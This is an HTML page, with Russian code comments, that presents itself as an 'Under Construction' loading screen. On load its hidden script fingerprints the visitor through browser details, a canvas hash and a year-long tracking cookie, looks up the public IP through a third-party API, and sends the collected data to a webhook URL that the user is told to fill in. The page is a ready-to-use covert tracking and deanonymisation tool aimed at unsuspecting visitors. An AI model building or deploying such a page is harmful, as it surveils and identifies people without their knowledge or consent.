<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Under Construction</title>
    <style>
        body { background: #1a1a1a; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 2px solid #00ff00; padding: 20px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="loader">Loading secure environment... [OK]</div>

    <script>
        async function collectData() {
            // 1. Сбор базовых параметров браузера
            const data = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                touchPoints: navigator.maxTouchPoints,
                cookiesEnabled: navigator.cookieEnabled,
                referrer: document.referrer || "direct",
                cores: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory || "unknown"
            };

            // 2. Работа с Cookies (установка "метки" на будущее)
            if (!document.cookie.includes("osint_tracker")) {
                const trackId = "ID-" + Math.random().toString(36).substr(2, 9);
                document.cookie = `osint_tracker=${trackId}; max-age=31536000; path=/`;
                data.firstVisit = true;
                data.trackId = trackId;
            } else {
                data.firstVisit = false;
                data.trackId = document.cookie.split('osint_tracker=')[1].split(';')[0];
            }

            // 3. Генерация Canvas Fingerprint (уникальный ID железа)
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.fillText("OSINT-Test", 2, 2);
            data.canvasFingerprint = canvas.toDataURL().slice(-50); // Берем хвост хэша

            // 4. Попытка получить реальный IP через сторонний API
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const ipData = await response.json();
                data.publicIP = ipData.ip;
            } catch (e) {
                data.publicIP = "Blocked by AdBlocker";
            }

            // 5. ОТПРАВКА ДАННЫХ
            // ВСТАВЬ СВОЙ URL ОТ WEBHOOK.SITE НИЖЕ
            const webhookUrl = 'ТВОЯ_ССЫЛКА_WEBHOOK_SITE';

            fetch(webhookUrl, {
                method: 'POST',
                mode: 'no-cors', // чтобы не ругался CORS
                body: JSON.stringify(data)
            });

            console.log("Data sent to collector");
        }

        collectData();
    </script>
</body>
</html>
